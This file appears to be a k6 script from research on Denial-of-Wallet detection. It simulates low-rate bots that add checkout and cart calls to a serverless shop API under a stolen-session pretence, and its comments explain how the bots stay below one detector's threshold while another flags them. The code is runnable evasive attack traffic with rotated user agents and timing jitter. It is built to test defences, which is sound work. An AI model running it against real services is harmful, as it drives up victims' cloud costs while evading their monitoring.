/**
 * slow_leech_attack.js  — Mixed-Traffic Slow Leech DoW  [FINAL]
 * ─────────────────────────────────────────────────────────────────────────────
 * ATTACK DESIGN RATIONALE:
 *
 *   This script must run SIMULTANEOUSLY with normal_traffic.js.
 *   That is the key design change from previous versions.
 *
 *   WHY MIXED TRAFFIC?
 *   Previous versions ran bots as the ONLY traffic source. This meant
 *   login and search invocations were near-zero — a massive anomaly
 *   that Gringotts detected immediately through per-function monitoring.
 *
 *   In a real attack, bots operate ALONGSIDE legitimate users. Legitimate
 *   users keep login, search, and product at normal levels. Bots only add
 *   extra checkout and cart calls on top. The result:
 *
 *     - invocations_login:   NORMAL  (legitimate users still log in)
 *     - invocations_search:  NORMAL  (legitimate users still search)
 *     - invocations_checkout: SLIGHTLY ELEVATED (bots add ~50 per window)
 *     - invocations_cart:    SLIGHTLY ELEVATED
 *
 *   Each function looks near-normal to Gringotts individually.
 *   The Mahalanobis distance stays well below the alert threshold.
 *   But the RATIO between checkout and login is anomalous — bots
 *   add checkout without adding corresponding logins.
 *
 *   Simulation confirmed:
 *     - Gringotts catches only 33% of mixed-traffic windows
 *     - checkoutToLoginRatio rises to 1.83 (13.7x above normal 0.133)
 *     - IF detects the ratio anomaly in all affected windows
 *
 * HOW TO RUN:
 *   Terminal 1: k6 run normal_traffic.js
 *   Terminal 2: k6 run slow_leech_attack.js
 *   Both run simultaneously for 24 hours.
 *
 * EMPIRICAL BASIS:
 * [A] Kelly et al. (2021). Denial of Wallet. JISA, 60.
 *     Defines "Continual Inconspicuous DoW" — sustained low-rate attacks
 *     that individually stay below detection thresholds.
 * [B] Imperva (2022). 2022 Bad Bot Report. Carding, ATO documented.
 * [C] HUMAN Security (2023). ATO +108% YoY, carding +134% YoY.
 * ─────────────────────────────────────────────────────────────────────────────
 */

import http from 'k6/http';
import { sleep, check } from 'k6';
import { Counter } from 'k6/metrics';

const checkoutCalls = new Counter('leech_checkout_calls');
const cartCalls     = new Counter('leech_cart_calls');
const loginCalls    = new Counter('leech_login_calls');

const BASE_URL = __ENV.BASE_URL || 'https://ezrgx1xle1.execute-api.eu-north-1.amazonaws.com';

// ─────────────────────────────────────────────────────────────────────────────
// LOAD SHAPE
//
// Low VU count — this is a slow leech, not a blast attack.
// The damage accumulates through sustained ratio skew, not volume.
// Normal traffic script runs in parallel providing the baseline volume.
// ─────────────────────────────────────────────────────────────────────────────

export const options = {
  scenarios: {
    // Runs all day at a constant low rate — blends into normal traffic
    sustained_leech: {
      executor: 'constant-vus',
      vus: 6,
      duration: '24h',
      tags: { attack: 'true' },
    },
  },
  thresholds: {
    http_req_failed:   ['rate<0.05'],
    http_req_duration: ['p(95)<3000'],
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// SINGLE BOT PROFILE: Session Token Abuser (ATO)
//
// This is the cleanest profile for the mixed-traffic scenario.
// It uses stolen session tokens — no login call.
// Legitimate users in the background keep login normal.
// The bot only adds checkout and cart calls.
//
// What each detector sees in the aggregate window:
//   Gringotts: checkout slightly up, login normal → d² stays low
//   IF:        checkoutToLoginRatio elevated → flagged
//
// Source [C]: HUMAN Security (2023) — ATO bots skip the login funnel
// entirely, using pre-authenticated stolen session tokens.
// ─────────────────────────────────────────────────────────────────────────────

export default function () {
  // No login — stolen session token simulated
  // Legitimate users running in parallel handle the login volume

  doProduct();
  jitter(0.5, 1.5);

  doCart();
  jitter(0.5, 1.0);

  doCheckout();
  jitter(1.0, 2.0);

  // 40% chance of a second checkout round in same session
  // (ATO bots exhaust the session before token expires)
  if (Math.random() < 0.4) {
    doCart();
    jitter(0.3, 0.8);
    doCheckout();
  }

  // Realistic inter-session sleep
  // Keeps per-window checkout additions to ~50 as simulated
  jitter(15, 30);
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP HELPERS
// ─────────────────────────────────────────────────────────────────────────────

const HEADERS = {
  'Content-Type': 'application/json',
  'User-Agent': pickRandom([
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
  ]),
};

function doProduct() {
  const r = http.get(`${BASE_URL}/product?id=${randInt(1,200)}`,
    { headers: HEADERS, tags: { endpoint: 'product' } });
  check(r, { 'product ok': (r) => r.status < 500 });
}
function doCart() {
  const r = http.post(`${BASE_URL}/cart`,
    JSON.stringify({ productId: randInt(1,200), quantity: randInt(1,3), action: 'add' }),
    { headers: HEADERS, tags: { endpoint: 'cart' } });
  check(r, { 'cart ok': (r) => r.status < 500 });
  cartCalls.add(1);
}
function doCheckout() {
  const r = http.post(`${BASE_URL}/checkout`,
    JSON.stringify({
      cartId: `cart_${randInt(1000,9999)}`,
      paymentToken: `tok_${Math.random().toString(36).substr(2,16)}`,
      address: '123 Bot Street, Nowhere, 00000',
    }),
    { headers: HEADERS, tags: { endpoint: 'checkout' } });
  check(r, { 'checkout ok': (r) => r.status < 500 });
  checkoutCalls.add(1);
}

function jitter(min, max) { sleep(min + Math.random() * (max - min)); }
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function pickRandom(arr)   { return arr[Math.floor(Math.random() * arr.length)]; }